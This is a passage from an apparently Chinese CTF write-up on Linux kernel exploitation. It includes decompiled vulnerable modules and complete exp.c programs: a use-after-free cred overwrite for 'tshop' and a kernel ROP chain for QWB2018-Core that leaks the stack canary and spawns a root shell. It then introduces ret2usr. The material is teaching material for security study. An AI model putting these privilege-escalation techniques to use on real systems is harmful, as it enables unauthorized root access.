<p>漏洞到这里已经很清楚了，bss上的全局变量释放后未清空，保护有<code>smap</code>和<code>smep</code>，调试可以看到(源码也可以直接看)cred大小恰为0xd0，所以我们释放一个obj，随后fork进程复用这个obj，在主进程再次释放此obj随即alloc到它，之前的*(obj+8)可以将uid位清零，子进程的权限提升为root。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">tshop_ioctl</span><span class="params">(__int64 arg1, <span class="keyword">unsigned</span> <span class="keyword">int</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">int</span> arg3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  _QWORD *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// si</span></span><br><span class="line">  __int64 v8; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v9; <span class="comment">// rdi</span></span><br><span class="line">  _QWORD *v11; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *v12; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = (<span class="keyword">signed</span> <span class="keyword">int</span>)arg3;</span><br><span class="line">  <span class="keyword">if</span> ( arg2 == <span class="number">0x22B8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( arg3 &lt;= <span class="number">0xFF</span> &amp;&amp; (v12 = (_QWORD *)BUY_LIST[arg3]) != <span class="number">0L</span>L )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="string">"&lt;1&gt;[*] This Zege is yours!"</span>;</span><br><span class="line">      *v12 = <span class="number">0x123456789ABCDEF0</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="string">"&lt;1&gt;[*] Zege would not like you!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( arg2 &gt; <span class="number">0x22B8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( arg2 == <span class="number">0x271A</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( arg3 &lt;= <span class="number">0xFF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = (_QWORD *)kmem_cache_alloc(zegeorjige, <span class="number">0xD0</span>LL);</span><br><span class="line">        BUY_LIST[v3] = (__int64)v4;</span><br><span class="line">        *v4 = <span class="number">0L</span>L;</span><br><span class="line">        v5 = zegeandjigedesc;</span><br><span class="line">        *(_QWORD *)(BUY_LIST[v3] + <span class="number">8</span>) = <span class="number">0L</span>L;</span><br><span class="line">        *(_QWORD *)(BUY_LIST[v3] + <span class="number">16</span>) = <span class="number">64L</span>L;</span><br><span class="line">        *(_QWORD *)(BUY_LIST[v3] + <span class="number">24</span>) = <span class="number">0x29AA</span>LL;</span><br><span class="line">        v6 = <span class="number">0L</span>L;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v7 = v5[v6];</span><br><span class="line">          v8 = (<span class="keyword">signed</span> <span class="keyword">int</span>)v6++;</span><br><span class="line">          *(_BYTE *)(BUY_LIST[v3] + v8 + <span class="number">0x20</span>) = v7;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v6 != <span class="number">0x21</span> );</span><br><span class="line">        v9 = <span class="string">"&lt;1&gt;[*] Money fly\n"</span>;</span><br><span class="line">        *(_BYTE *)(BUY_LIST[v3] + <span class="number">0x41</span>) = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( arg2 != <span class="number">0x2766</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">      <span class="keyword">if</span> ( arg3 &lt;= <span class="number">0xFF</span> &amp;&amp; BUY_LIST[arg3] )</span><br><span class="line">      &#123;</span><br><span class="line">        kfree();</span><br><span class="line">        v9 = <span class="string">"&lt;1&gt;[*] Say goodbye to flag\n"</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = <span class="string">"&lt;1&gt;[*] Zege and Jige would not like you!"</span>;</span><br><span class="line">LABEL_16:</span><br><span class="line">    printk(v9);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( arg2 == <span class="number">0x1A0A</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( arg3 &lt;= <span class="number">0xFF</span> &amp;&amp; (v11 = (_QWORD *)BUY_LIST[arg3]) != <span class="number">0L</span>L )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="string">"&lt;1&gt;[*] This Jige is yours!"</span>;</span><br><span class="line">      *v11 = <span class="number">0xFEDCBA987654321</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="string">"&lt;1&gt;[*] Jige would not like you!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="exp-c"><a href="#exp-c" class="headerlink" title="exp.c"></a>exp.c</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MallocCmd 0x271a</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FreeCmd 0x2766</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Malloc</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd,MallocCmd,idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Free</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd,FreeCmd,idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/tshop"</span>,<span class="number">2</span>);</span><br><span class="line">    Malloc(fd,<span class="number">0</span>);</span><br><span class="line">    Malloc(fd,<span class="number">1</span>);</span><br><span class="line">    Free(fd,<span class="number">0</span>);</span><br><span class="line">    Free(fd,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> pid = fork();<span class="comment">//now we alloc cred using obj1</span></span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(getuid() != <span class="number">0</span>)&#123;</span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        system(<span class="string">"id"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        Free(fd,<span class="number">1</span>);<span class="comment">//now we free cred</span></span><br><span class="line">        Malloc(fd,<span class="number">2</span>);<span class="comment">//set uid=0</span></span><br><span class="line">        <span class="comment">//wait(NULL);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Kernel-ROP"><a href="#Kernel-ROP" class="headerlink" title="Kernel ROP"></a>Kernel ROP</h2><h3 id="QWB2018-Core"><a href="#QWB2018-Core" class="headerlink" title="QWB2018-Core"></a>QWB2018-Core</h3><h4 id="寻找rops"><a href="#寻找rops" class="headerlink" title="寻找rops"></a>寻找rops</h4><p>vmlinux是未经压缩的二进制文件，可以使用<code>ropper --file ./vmlinux &gt; rops</code>将寻找的rop存放起来，如果题目没有给vmlinux可以拿<a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux" target="_blank" rel="noopener">extract-vmlinux</a>进行提取<code>./extract-vmlinux ./bzImage &gt; ./vmlinux</code></p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>查看启动脚本，发现开了<code>kaslr</code>保护，解压cpio文件<code>cpio -idm &lt; ./core.cpio</code>，文件夹下有系统的初始化脚本init，其内容为。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'sh end!\n'</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<p>前面实在创建设备驱动，挂载设备，之后将kallsyms的内容拷贝到/tmp/kallsyms文件中，<code>kptr_restrict</code>为1表示root用户可以读取内核符号地址而普通用户不能。同理<code>dmesg_restrict</code>为1表示root用户可以查看dmesg信息而普通用户不能。</p>
<p>后面是设置网卡和路由信息，启动了一个uid为1000的普通用户所在的shell，poweroff这行是设置120s定时关机，我们为了避免干扰做题先注释掉，同样为了之后能看text段的基址我们把uid改成0，即root用户。</p>
<p>最后的insmod插入了一个内核模块<code>core.ko</code>，这个就是本题的漏洞模块，我们等会来分析它。现在把文件系统重新打包(文件系统中有个打包脚本，参数为打包的压缩文件名，打包之后拷到上层目录即可)</p>
<p>下面分析core.ko</p>
<p>在ioctl函数里实现了几种功能，其中arg1表示choice，arg2为参数2。</p>
<ol>
<li>arg1=0x6677889B时，调用core_read(arg2)，从v4[off]拷贝0x40长度的数据到arg2指定的用户地址，这里off是一个全局变量</li>
<li>arg1=0x6677889C，将arg2赋值给off(结合1和2我们可以泄露栈上数据)</li>
<li>arg1=0x6677889A，调用core_copy_func，arg2指定size，拷贝arg2长度的数据从name到栈局部变量v1，这里检查了size要小于等于0x3f，但是qememcpy用的类型是int16，因此我们传入一个负数即可绕过检查(因为size指定，这里可以栈溢出)</li>
<li>core_write函数把用户空间的数据拷贝到bss的全局变量name上，size也是用户指定的长度</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">core_ioctl</span><span class="params">(__int64 a1, <span class="keyword">int</span> arg1, __int64 arg2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( arg1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889B</span>:</span><br><span class="line">      core_read(arg2);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889C</span>:</span><br><span class="line">      printk(<span class="string">"\x016core: %d\n"</span>);</span><br><span class="line">      off = arg2;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889A</span>:</span><br><span class="line">      printk(<span class="string">"\x016core: called core_copy\n"</span>);</span><br><span class="line">      core_copy_func(arg2);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">core_read</span><span class="params">(__int64 user_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 user_addr1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  user_addr1 = user_addr;</span><br><span class="line">  v5 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(<span class="string">"\x016core: called core_read\n"</span>);</span><br><span class="line">  printk(<span class="string">"\x016%d %p\n"</span>);</span><br><span class="line">  v2 = v4;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16L</span>L; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">0</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, <span class="string">"Welcome to the QWB CTF challenge.\n"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( copy_to_user(user_addr1, &amp;v4[off], <span class="number">64L</span>L) )</span><br><span class="line">    __asm &#123; swapgs &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">core_copy_func</span><span class="params">(<span class="keyword">signed</span> __int64 size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(<span class="string">"\x016core: called core_writen"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x3F</span> )</span><br><span class="line">    printk(<span class="string">"\x016Detect Overflow"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    qmemcpy(v1, name, (<span class="keyword">unsigned</span> __int16)size);  <span class="comment">// overflow</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">core_write</span><span class="params">(__int64 a1, __int64 user_addr, <span class="keyword">unsigned</span> __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  size = a3;</span><br><span class="line">  printk(<span class="string">"\x016core: called core_writen"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(name, user_addr, size) )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size;</span><br><span class="line">  printk(<span class="string">"\x016core: error copying data from userspacen"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFF2</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>我们现在有地址泄露和栈溢出，用到的就是这里讲到的kernel rop，思路如下：</p>
<ol>
<li>利用ioctl结合core_read泄露地址及canary</li>
<li>利用core_write吧gadgets写到name上</li>
<li>利用copy_func将gadgets写到栈上</li>
<li>通过rop执行<code>commit_creds(prepare_kernel_cred(0))</code></li>
<li>返回用户态，执行system(“/bin/sh”)起shell(使用<code>swapgs;iretq</code>来进行切换，但最开始要使用<code>save_status</code>保存寄存器的状态)</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __asm__(</span><br><span class="line">    <span class="string">"mov user_cs,cs;"</span></span><br><span class="line">    <span class="string">"mov user_ss,ss;"</span></span><br><span class="line">    <span class="string">"mov user_sp,rsp;"</span></span><br><span class="line">    <span class="string">"pushf;"</span></span><br><span class="line">    <span class="string">"pop user_rflags;"</span></span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[*] status has been saved."</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h4><p>tips1:ctrl+A再按X可以让qemu退出</p>
<p>使用<code>gdb ./vmlinux -q</code>调试内核，在qemu内部使用<code>cat /sys/module/core/sections/.text</code>查看基址，使用<code>add-symbol-file ./core.ko [text_base]</code>增加符号表，<code>b core_read</code>添加断点，<code>target remote localhost:1234</code>开始调试。</p>
<h4 id="exp-c-1"><a href="#exp-c-1" class="headerlink" title="exp.c"></a>exp.c</h4><p>最后在构造rop的时候的栈结构是<br>p_rdi<br>0<br>prepare_kernel_cred<br>mov rdi, rax<br>commit_creds<br>但是gadgets里没有直接能用的<code>mov rdi, rax; ret;</code>所以这里迂回了一下。构造的结构是：<br>p_rdi<br>0<br>prepare_kernel_cred<br>p_rdx_ret<br>p_rcx_ret<br>mov rdi, rax; call rdx;<br>commit_creds<br>注意写exp之前要先sava_status,在 64 位系统中执行 iretq 指令前需要执行一下 swapgs 指令，该指令将 gs 寄存器的值与 MSR 地址 中的值交换。在内核态常规操作（如系统调用）的入口处，执行 swapgs 指令获得指向内核数据结构的指针，那么对应的， 从内核态退出，返回到用户态时也需执行一下 swapgs<br>iretq用来恢复用户空间，需要给出之前保存的寄存器的值。恢复到用户空间之后一个<code>ret</code>到我们的<code>system(&quot;/bin/sh&quot;)</code>即可起root shell。</p>
<p>还有一个有意思的地方在于我们明明是在write里泄露的canary，在copy函数里进行的栈溢出，但是canary和栈布局都是一样的，而且在gdb中看到的输入地址距离rbp相去甚远，实际上却恰如其分。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds=<span class="number">0</span>,prepare_kernel_cred=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __asm__(</span><br><span class="line">    <span class="string">"mov user_cs,cs;"</span></span><br><span class="line">    <span class="string">"mov user_ss,ss;"</span></span><br><span class="line">    <span class="string">"mov user_sp,rsp;"</span></span><br><span class="line">    <span class="string">"pushf;"</span></span><br><span class="line">    <span class="string">"pop user_rflags;"</span></span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[*] status has been saved."</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetRootShell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())&#123;</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*] get root shell error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">FindVmlinuxBase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = fopen(<span class="string">"/tmp/kallsyms"</span>,<span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*]open symbol file failed."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,fd))&#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp;&amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">"commit_creds"</span>) &amp;&amp; !commit_creds)&#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex,buf,<span class="number">0x10</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex,<span class="string">"%llx"</span>,&amp;commit_creds);</span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[*]vmlinux base =&gt; %llx\n"</span>,vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">"prepare_kernel_cred"</span>) &amp;&amp; !prepare_kernel_cred)&#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex,buf,<span class="number">0x10</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex,<span class="string">"%llx"</span>,&amp;prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[*]vmlinux base =&gt; %llx\n"</span>,vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    FindVmlinuxBase();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]prepare_kernel_cred addr:%p\n"</span>,prepare_kernel_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]commit_creds addr:%p\n"</span>,commit_creds);</span><br><span class="line">    <span class="comment">//leak sth</span></span><br><span class="line">    <span class="keyword">int</span> core_fd = open(<span class="string">"/proc/core"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">char</span>* user_buf = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x50</span>*<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">    <span class="built_in">memset</span>(user_buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">0x50</span>);</span><br><span class="line">    <span class="comment">//set off=0x40</span></span><br><span class="line">    ioctl(core_fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">    <span class="comment">//read to user_buf</span></span><br><span class="line">    ioctl(core_fd,<span class="number">0x6677889B</span>,user_buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary = ((<span class="keyword">size_t</span>*)user_buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]leaked canary:%p"</span>,canary);</span><br><span class="line">    <span class="comment">//rops</span></span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">	rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]p_rdi addr:%p\n"</span>,<span class="number">0xffffffff81000b2f</span>+offset);</span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)GetRootShell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(core_fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889a</span>,<span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ret2usr"><a href="#ret2usr" class="headerlink" title="ret2usr"></a>ret2usr</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>利用的是内核态位于ring 0，可以执行用户态的函数，我们不必自己构造调用链，而可以直接在用户态构造好我们需要的函数，在内核rop的时候直接调用即可，当然这些函数用户态是没有的，我们还是得先泄露出来。exp编写如下：</p>
